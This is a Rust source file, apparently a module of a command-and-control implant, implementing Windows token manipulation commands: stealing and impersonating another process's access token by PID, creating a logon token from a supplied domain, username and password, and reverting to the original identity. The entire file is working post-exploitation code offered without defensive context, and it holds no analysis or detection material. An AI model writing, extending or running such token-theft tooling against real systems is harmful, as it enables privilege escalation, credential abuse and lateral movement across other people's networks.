//! Token manipulation — steal, make, impersonate, revert.

use anyhow::Result;

pub async fn steal(args: &[String]) -> Result<String> {
    if args.is_empty() {
        return Err(anyhow::anyhow!("usage: token_steal <pid>"));
    }
    let pid: u32 = args[0].parse()?;

    #[cfg(target_os = "windows")]
    return steal_windows(pid);
    #[cfg(not(target_os = "windows"))]
    Ok(format!("token_steal stub: pid={pid}"))
}

#[cfg(target_os = "windows")]
fn steal_windows(pid: u32) -> Result<String> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        Security::{
            DuplicateTokenEx, ImpersonateLoggedOnUser,
            SecurityImpersonation, TokenPrimary,
        },
        System::Threading::{
            OpenProcess, OpenProcessToken,
            PROCESS_QUERY_INFORMATION, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY,
        },
    };
    unsafe {
        let proc = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid);
        if proc == 0 {
            return Err(anyhow::anyhow!("OpenProcess failed for PID {pid}"));
        }

        let mut token = 0isize;
        if OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &mut token) == 0 {
            CloseHandle(proc);
            return Err(anyhow::anyhow!("OpenProcessToken failed"));
        }

        let mut dup = 0isize;
        if DuplicateTokenEx(token, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                            std::ptr::null(), SecurityImpersonation, TokenPrimary, &mut dup) == 0 {
            CloseHandle(token);
            CloseHandle(proc);
            return Err(anyhow::anyhow!("DuplicateTokenEx failed"));
        }

        ImpersonateLoggedOnUser(dup);

        CloseHandle(dup);
        CloseHandle(token);
        CloseHandle(proc);

        Ok(format!("[+] Impersonating token from PID {pid}"))
    }
}

pub async fn make(args: &[String]) -> Result<String> {
    // Create token from credentials: args = [domain, user, pass]
    if args.len() < 3 {
        return Err(anyhow::anyhow!("usage: make_token <domain> <user> <pass>"));
    }

    #[cfg(target_os = "windows")]
    {
        use windows_sys::Win32::Security::LogonUserW;
        use windows_sys::Win32::Security::LOGON32_LOGON_NEW_CREDENTIALS;
        use windows_sys::Win32::Security::LOGON32_PROVIDER_DEFAULT;
        let domain: Vec<u16> = args[0].encode_utf16().chain(std::iter::once(0)).collect();
        let user:   Vec<u16> = args[1].encode_utf16().chain(std::iter::once(0)).collect();
        let pass:   Vec<u16> = args[2].encode_utf16().chain(std::iter::once(0)).collect();
        let mut token = 0isize;
        unsafe {
            if LogonUserW(user.as_ptr(), domain.as_ptr(), pass.as_ptr(),
                          LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT,
                          &mut token) != 0 {
                windows_sys::Win32::Security::ImpersonateLoggedOnUser(token);
                windows_sys::Win32::Foundation::CloseHandle(token);
                return Ok(format!("[+] Token created for {}\\{}", args[0], args[1]));
            }
        }
        return Err(anyhow::anyhow!("LogonUser failed"));
    }
    #[allow(unreachable_code)]
    Ok(format!("make_token stub: {}\\{}", args[0], args[1]))
}

pub async fn rev2self() -> Result<String> {
    #[cfg(target_os = "windows")]
    unsafe {
        windows_sys::Win32::Security::RevertToSelf();
    }
    Ok("[+] Reverted to self".into())
}
